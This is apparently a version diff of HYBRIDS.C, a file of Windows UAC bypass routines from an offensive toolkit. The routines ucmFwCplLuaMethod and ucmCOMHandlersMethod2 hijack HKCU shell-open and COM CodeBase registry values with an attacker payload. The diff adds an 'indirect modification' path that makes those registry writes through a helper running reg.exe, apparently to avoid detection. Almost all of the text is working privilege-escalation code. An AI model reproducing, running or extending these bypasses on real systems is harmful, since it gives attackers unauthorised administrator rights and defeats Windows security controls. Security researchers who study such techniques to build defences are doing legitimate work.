@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     3.17
+*  VERSION:     3.19
 *
-*  DATE:        20 Mar 2019
+*  DATE:        22 May 2019
 *
 *  Hybrid UAC bypass methods.
 *
@@ -766,7 +766,7 @@ NTSTATUS ucmGWX(
         //File already exist, so IIS could be installed
         if (PathFileExists(szDest)) {
 #ifdef _DEBUG
-            supDebugPrint(TEXT("ucmGWX"), STATUS_OBJECT_NAME_EXISTS);
+            supDebugPrint(TEXT("ucmGWX"), ERROR_FILE_EXISTS);
 #endif
             MethodResult = STATUS_OBJECT_NAME_EXISTS;
             break;
@@ -776,7 +776,7 @@ NTSTATUS ucmGWX(
         Ptr = supReadFileToBuffer(KONGOU_CD, &DataSize);
         if (Ptr == NULL) {
 #ifdef _DEBUG
-            supDebugPrint(TEXT("ucmGWX"), STATUS_OBJECT_NAME_NOT_FOUND);
+            supDebugPrint(TEXT("ucmGWX"), ERROR_FILE_NOT_FOUND);
 #endif
             MethodResult = STATUS_OBJECT_NAME_NOT_FOUND;
             break;
@@ -2301,10 +2301,7 @@ NTSTATUS ucmFwCplLuaMethod(
 
     NTSTATUS    MethodResult = STATUS_ACCESS_DENIED;
 
-    HANDLE      hProcess = NULL;
     HRESULT     r = E_FAIL, hr_init;
-
-    PWSTR       pszBuffer = NULL;
 
     LRESULT     lResult;
     HKEY        hKey = NULL;
@@ -2319,7 +2316,7 @@ NTSTATUS ucmFwCplLuaMethod(
     do {
 
 #ifdef _DEBUG
-        g_ctx->MethodExecuteType = ucmExTypeDefault;
+        g_ctx->MethodExecuteType = ucmExTypeIndirectModification;
 #endif
 
         RtlSecureZeroMemory(szKey, sizeof(szKey));
@@ -2352,43 +2349,21 @@ NTSTATUS ucmFwCplLuaMethod(
         // Set "Default" value as our payload.
         // 
         sz = (1 + sz) * sizeof(WCHAR);
+        lResult = ERROR_ACCESS_DENIED;
 
         switch (g_ctx->MethodExecuteType) {
 
         case ucmExTypeIndirectModification:
 
-            pszBuffer = (PWSTR)supHeapAlloc((MAX_PATH * 4) + sz);
-            if (pszBuffer) {
-                _strcpy(pszBuffer, g_ctx->szSystemDirectory);
-                _strcat(pszBuffer, REG_EXE);
-                _strcat(pszBuffer, TEXT(" add "));
-                _strcat(pszBuffer, REG_HKCU);
-                _strcat(pszBuffer, TEXT("\\"));
-                _strcat(pszBuffer, T_MSC_SHELL);
-                _strcat(pszBuffer, T_SHELL_OPEN_COMMAND);
-                _strcat(pszBuffer, TEXT(" /d \""));
-                _strcat(pszBuffer, lpszPayload);
-                _strcat(pszBuffer, TEXT("\" /f"));
-
-                hProcess = supRunProcessIndirect(
-                    pszBuffer,
-                    NULL,
-                    NULL,
-                    0,
-                    SW_HIDE,
-                    NULL);
-
-                if (hProcess) {
-                    dwKeyDisposition = REG_CREATED_NEW_KEY;
-                    if (WaitForSingleObject(hProcess, 5000) == WAIT_TIMEOUT)
-                        TerminateProcess(hProcess, 0);
-                    CloseHandle(hProcess);
-                }
-                else {
-                    lResult = ERROR_ACCESS_DENIED;
-                }
-                supHeapFree(pszBuffer);
+            if (supIndirectRegAdd(REG_HKCU,
+                szKey,
+                NULL,
+                NULL,
+                lpszPayload))
+            {
+                lResult = ERROR_SUCCESS;
             }
+
             break;
 
         case ucmExTypeRegSymlink:
@@ -2747,6 +2722,10 @@ NTSTATUS ucmCOMHandlersMethod2(
     WCHAR szBuffer[MAX_PATH * 2], szKey[MAX_PATH * 2];
     WCHAR szConvertedName[MAX_PATH * 3];
 
+#ifdef _DEBUG
+    g_ctx->MethodExecuteType = ucmExTypeIndirectModification;
+#endif
+
     do {
 
         //
@@ -2854,14 +2833,38 @@ NTSTATUS ucmCOMHandlersMethod2(
             s++;
         }
 
-        cbData = (DWORD)((1 + _strlen(szConvertedName)) * sizeof(WCHAR));
-        lResult = RegSetValueEx(
-            SourceKey,
-            T_CODEBASE,
-            0,
-            REG_SZ,
-            (BYTE*)szConvertedName,
-            cbData);
+        lResult = ERROR_ACCESS_DENIED;
+
+        switch (g_ctx->MethodExecuteType) {
+
+        case ucmExTypeIndirectModification:
+
+            if (supIndirectRegAdd(REG_HKCU,
+                szKey,
+                T_CODEBASE,
+                T_REG_SZ,
+                szConvertedName))
+            {
+                lResult = ERROR_SUCCESS;
+            }
+
+            break;
+
+        case ucmExTypeDefault:
+        default:
+            cbData = (DWORD)((1 + _strlen(szConvertedName)) * sizeof(WCHAR));
+            lResult = RegSetValueEx(
+                SourceKey,
+                T_CODEBASE,
+                0,
+                REG_SZ,
+                (BYTE*)szConvertedName,
+                cbData);
+            break;
+        }
+
+        if (lResult != ERROR_SUCCESS)
+            break;
 
         RegCloseKey(SourceKey);
         SourceKey = NULL;
@@ -2875,17 +2878,41 @@ NTSTATUS ucmCOMHandlersMethod2(
         if (lResult != ERROR_SUCCESS)
             break;
 
-        //
-        // Set CodeBase value.
-        // cbData unchanged.
-        //
-        lResult = RegSetValueEx(
-            SourceKey,
-            T_CODEBASE,
-            0,
-            REG_SZ,
-            (BYTE*)szConvertedName,
-            cbData);
+        lResult = ERROR_ACCESS_DENIED;
+
+        switch (g_ctx->MethodExecuteType) {
+
+        case ucmExTypeIndirectModification:
+
+            if (supIndirectRegAdd(REG_HKCU,
+                szKey,
+                T_CODEBASE,
+                T_REG_SZ,
+                szConvertedName))
+            {
+                lResult = ERROR_SUCCESS;
+            }
+
+            break;
+
+        case ucmExTypeDefault:
+        default:
+            //
+            // Set CodeBase value.
+            // cbData unchanged.
+            //
+            lResult = RegSetValueEx(
+                SourceKey,
+                T_CODEBASE,
+                0,
+                REG_SZ,
+                (BYTE*)szConvertedName,
+                cbData);
+            break;
+        }
+
+        if (lResult != ERROR_SUCCESS)
+            break;
 
         //
         // Set Assembly value.
